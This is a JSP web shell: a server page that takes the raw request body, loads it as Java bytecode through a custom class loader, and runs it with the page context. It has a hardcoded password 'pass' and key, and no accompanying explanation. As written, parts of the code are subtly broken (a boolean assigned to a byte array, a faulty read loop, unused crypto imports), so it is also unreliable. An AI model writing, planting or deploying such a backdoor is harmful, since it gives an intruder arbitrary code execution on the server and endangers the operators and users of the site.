<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
String xc="3c6e0b8a9c15224a";
String pass="pass";
String md5=md5(pass+xc);
class X extends ClassLoader{
    public X(ClassLoader z){super(z);}
    public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);}
}
public static String md5(String s) {
    try { java.security.MessageDigest m=java.security.MessageDigest.getInstance("MD5");
    m.update(s.getBytes(),0,s.length()); return new java.math.BigInteger(1,m.digest()).toString(16);
    } catch(Exception e) { return null; }
}
%>
<%
try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];
java.io.InputStream inputStream=request.getInputStream();
int _num=0;
while((_num+=inputStream.read(data,_num,data.length))< data.length);
data=new X(this.getClass().getClassLoader()).Q(data).newInstance().equals(pageContext);
}catch(Exception e){}
%>
